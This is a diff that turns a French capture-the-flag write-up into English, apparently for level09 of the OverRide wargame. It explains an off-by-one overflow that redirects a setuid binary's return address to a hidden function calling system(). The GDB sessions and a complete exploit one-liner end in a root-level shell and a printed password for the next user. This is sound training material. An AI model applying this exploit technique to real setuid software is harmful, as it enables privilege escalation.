@@ -1,19 +1,26 @@
+# level09
+
+```bash
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
 level09@OverRide:~$ file level09 
 level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454, not stripped
+```
 
-Dans GDB, l'adresse des fonctions n'est pas la bonne tant que le programmne n est pas demarrer.
+In GDB, addresses are not accurate until the program is running.
 
+```gdb
 (gdb) info function secret_backdoor 
 All functions matching regular expression "secret_backdoor":
 Non-debugging symbols:
 0x000055555555488c  secret_backdoor
+```
 
-Dans la fonction set_username, nous allons ecrire 41 bytes sur str+140 qui represente la variable utiliser dans set_msg pour stocker le msg, nous allons donc depasser de 1 byte sur la variable qui represente la taille du strncpy dans set_msg qui de base est de 1 octet
+In `set_username` function, we will write 41 bytes to begin to overflow the same buffer use in `set_msg` function. The byte after the 40 is the length used in the `strncpy` of `set_msg`.
 
-Nous pouvons voir qu'avec la commande suivante nous ecrasons la valeur de $save_eip.
+We can see that with the following command, EIP is overwritten:
 
+```gdb
 (gdb) r <<< $(python -c "print 40 * 'a' + '\xff' + '\n' + 'A' * 2000")
 Starting program: /home/users/level09/level09 <<< $(python -c "print 40 * 'a' + '\xff' + '\n' + 'A' * 2000")
 --------------------------------------------
@@ -39,17 +46,34 @@ Stack level 0, frame at 0x7fffffffe5e8:
  Locals at 0x4141414141414141, Previous frame's sp is 0x7fffffffe5f0
  Saved registers:
   rip at 0x7fffffffe5e8
+```
 
-Il s'agit donc du save_eip de handle_msg() que nous ecrasons.
+We overwrite here on the `eip` of `handle_msg` function.
 
+```gdb
 => 0x00005555555549c6 <+148>:   call   0x555555554720 <strncpy@plt>
 (gdb) x/wx $rdi
 0x7fffffffe520: 0x0000000a
 (gdb) p/d 0x7fffffffe5e8-0x7fffffffe520
 $8 = 200
+```
 
-Nous constatons que l'adresse de save_eip de handle_msg() est a 200 bytes de l'adresse de destination ddu strncpy
+We can see here that the address of `eip` in `handle_msg` is 200 bytes far from the destination address of `strcnpy`.
 
-Dans la fonction secret_backdoor il y a une derniere user_input ou le resultat ira en parametre de system()
+The last thing is that `secret_backdoor` function uses `fgets` before calling `system`. We just need to pass `/bin/sh`.
 
-(python -c "print 40 * 'a' + '\xd0' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh'";cat) | ./level09
+Try to get the flag:
+
+```bash
+level09@OverRide:~$ (python -c "print 40 * 'a' + '\xd0' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh'";cat) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
+>>: >: Msg sent!
+whoami
+end
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+```
